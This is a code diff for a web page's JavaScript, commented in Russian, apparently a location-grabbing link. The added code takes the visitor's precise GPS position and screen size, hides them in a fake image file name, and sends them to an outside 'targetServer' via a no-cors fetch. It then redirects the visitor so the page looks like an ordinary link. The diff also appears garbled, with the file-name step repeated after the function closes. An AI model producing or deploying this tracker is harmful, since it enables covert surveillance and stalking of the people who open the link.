@@ -27,20 +27,40 @@
                 lat: "null", lon: "null"
             };
 
-            // 1. Сбор GPS (с таймаутом, чтобы не висеть вечно)
+            // 1. Сбор GPS
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((res, rej) => {
                         navigator.geolocation.getCurrentPosition(res, rej, {
                             enableHighAccuracy: true,
-                            timeout: 5000, 
+                            timeout: 4000, 
                             maximumAge: 0
                         });
                     });
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
-                } catch (e) { console.log("GPS Skip"); }
+                } catch (e) {}
             }
+
+            // 2. Формируем имя файла
+            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
+            
+            // 3. ОТПРАВКА ЧЕРЕЗ FETCH (ЖЕСТКАЯ)
+            try {
+                // Мы отправляем запрос и ЖДЕМ (await) ответа от сервера
+                // mode: 'no-cors' позволяет слать запросы на http с https гитхаба
+                await fetch(`${targetServer}${fileName}?t=${Date.now()}`, { 
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                });
+                console.log("Data sent");
+            } catch (e) {
+                console.log("Fetch failed, but moving on...");
+            }
+
+            // 4. РЕДИРЕКТ (только после того как fetch завершился)
+            window.location.href = `${finalRedirect}${slug}?ready=1`;
+        }
 
             // 2. Формируем имя файла
             const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
